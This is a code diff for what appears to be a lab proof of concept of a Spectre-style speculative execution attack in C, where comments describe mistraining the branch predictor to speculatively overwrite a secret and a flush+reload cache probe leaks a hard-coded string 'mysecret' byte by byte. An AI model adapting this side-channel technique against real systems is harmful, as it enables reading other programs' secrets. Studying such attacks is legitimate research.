@@ -9,17 +9,17 @@
 #define REPETITIONS 10
 #define CACHE_HIT 100
 #define MAYBE_CACHE_HIT 175
-#define SECRET_SIZE 1
+#define SECRET_SIZE 8
 #define N_TRAINING 10
 #define BUF_SIZE 13
 
 
 
 typedef struct cache_vars {
+    char* super_secret;
     char user_idx;
     char user_char;
     char user_passwd;
-    char super_secret;
     char secret;                                                    //OPTION 1: works for some reason?
     char buf[BUF_SIZE];
     //char secret;                                                  //OPTION 2: should work but does not
@@ -44,13 +44,13 @@ cache_vars_t cache    __attribute__ ((aligned (256)));
  * Variables requried in mem:
  *  buf_size
  */
-void check_passwd(int user_idx, char user_char, char user_passwd, cp_t* flush_reload_arr, char super_secret) {
+void check_passwd(int user_idx, char user_char, char user_passwd, cp_t* flush_reload_arr, int secret_index) {
 
     cache.user_idx = user_idx;
     cache.user_char = user_char;
     cache.user_passwd = user_passwd;
     cache.secret = 'x';
-    cache.super_secret = super_secret;//97;
+    cache.super_secret = "mysecret";//100;//super_secret;//97;
     buf_size = BUF_SIZE;
 
     cpuid();
@@ -60,22 +60,17 @@ void check_passwd(int user_idx, char user_char, char user_passwd, cp_t* flush_re
     //bounds check should prevent overwrite. But speculatively executes
     if (cache.user_idx < buf_size) {
         cache.buf[cache.user_idx] = cache.user_char;
-        //volatile cp_t cp0 = flush_reload_arr[0];
     }
-
-    //volatile cp_t cp1 = flush_reload_arr[1];
 
     //secret has been (speculatively) overwritten with user char.
     if (cache.user_passwd == cache.secret) {
-        //volatile cp_t cp2 = flush_reload_arr[2];
-        volatile cp_t cp = flush_reload_arr[cache.secret];
-        //volatile cp_t cp = flush_reload_arr[cache.super_secret];
+        //volatile cp_t cp = flush_reload_arr[cache.secret];
+        volatile cp_t cp = flush_reload_arr[cache.super_secret[secret_index]];
         //printf("super secret: '%c' (%d)\n", cp.id, cp.id);
     }
-
 }
 
-int* overwrite(int index) {
+int* prepare(int secret_index) {
 
     cp_t* flush_reload_arr = init_flush_reload(N_PAGES);
     flush_arr((void*)flush_reload_arr, N_PAGES);
@@ -85,25 +80,22 @@ int* overwrite(int index) {
     int user_ids      [n_accesses];
     char user_chars   [n_accesses];
     char user_pwds    [n_accesses];
-    char user_s_secret[n_accesses];
 
     for(int i = 0; i < n_accesses; i++) {
         user_ids[i]             = i % BUF_SIZE;
         user_pwds[i]            = 'x';
         user_chars[i]           = 'a' + (i%26);
-        user_s_secret[i]        = 'b';
     }
 
     //set up parameters for attack function call.
     user_ids     [N_TRAINING]   = overwrite_index;
     user_pwds    [N_TRAINING]   = 's';
     user_chars   [N_TRAINING]   = 's';
-    user_s_secret[N_TRAINING]   = 'c';
     cpuid();
 
     //Misstrain branch predictor, last iteration is out-of-bounds attack function call
     for(int i = 0; i < n_accesses; i++) {
-        check_passwd(user_ids[i], user_chars[i], user_pwds[i], flush_reload_arr, user_s_secret[i]);
+        check_passwd(user_ids[i], user_chars[i], user_pwds[i], flush_reload_arr, secret_index);
         cpuid();
 
         //When function call was in training phase (so user_pwds[i]=='x'), flush all cache traces.
@@ -144,8 +136,8 @@ int main(int argc, char** argv) {
     for(int r = 0; r < REPETITIONS; r++) {
         printf("\nREPETITION %d\n", r);
         for (int s = 0; s < SECRET_SIZE; s++) {
-            results[r][s] = overwrite(s);
-            __sync_synchronize();
+            results[r][s] = prepare(s);
+            cpuid();
         }
     }
 
@@ -157,7 +149,7 @@ int main(int argc, char** argv) {
     //Prints cache struct for debug reasons only
     for(int i = 0; i < BUF_SIZE; i++) cache.buf[i] = i;
     cache.secret = 0xf1;
-    cache.super_secret = 0xf2;
+    cache.super_secret = (char*)0xabcdabcdabcdabcd;//0xf2;
     cache.user_idx = 0xaa;
     cache.user_passwd = 0xbb;
     cache.user_char = 0xcc;
